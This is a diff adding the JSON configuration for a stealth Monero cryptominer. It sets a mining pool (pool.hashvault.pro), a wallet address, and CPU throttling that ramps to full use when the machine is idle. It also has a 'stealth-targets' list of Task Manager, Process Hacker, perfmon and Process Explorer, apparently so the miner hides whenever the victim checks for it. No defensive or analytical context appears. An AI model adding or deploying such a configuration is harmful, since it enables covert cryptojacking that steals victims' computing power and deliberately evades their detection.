@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "pool.hashvault.pro",
+    "port": 443,
+    "wallet": "49sASDhA7NXCMk3GZ7efQpist3Wqwd51NNwRCban6BqHfvoMzTZH57zXkTbq7Cryfxh9yiqfQkuuWcQYecyuKyQg41Y5CkL",
+    "password": "universitet",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 40,
+    "idle-wait": 5,
+    "idle-cpu": 100,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
